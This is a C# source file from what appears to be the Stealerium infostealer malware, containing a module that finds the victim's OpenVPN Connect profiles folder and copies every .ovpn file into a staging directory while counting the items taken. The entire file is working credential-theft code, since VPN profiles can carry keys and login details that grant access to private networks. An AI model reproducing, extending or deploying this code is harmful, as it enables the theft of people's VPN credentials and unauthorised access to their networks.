using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN
{
    internal sealed class OpenVpn
    {
        // Save OpenVPN profiles to the specified path
        public static void Save(string savePath)
        {
            // Define the path to the "OpenVPN Connect" profiles directory
            var vpnProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");

            // Stop if the OpenVPN profiles directory does not exist
            if (!Directory.Exists(vpnProfilePath))
                return;

            try
            {
                // Create the directory to save profiles
                var profilesSavePath = Path.Combine(savePath, "profiles");
                Directory.CreateDirectory(profilesSavePath);

                // Copy all .ovpn files from the OpenVPN profiles directory
                foreach (var filePath in Directory.GetFiles(vpnProfilePath, "*.ovpn"))
                {
                    Counter.Vpn++;
                    var destinationPath = Path.Combine(profilesSavePath, Path.GetFileName(filePath));
                    File.Copy(filePath, destinationPath);
                }
            }
            catch (Exception error)
            {
                // Log or handle the exception if necessary
                Logging.Log("OpenVPN >> Error saving OpenVPN data:\n" + error);
            }
        }
    }
}
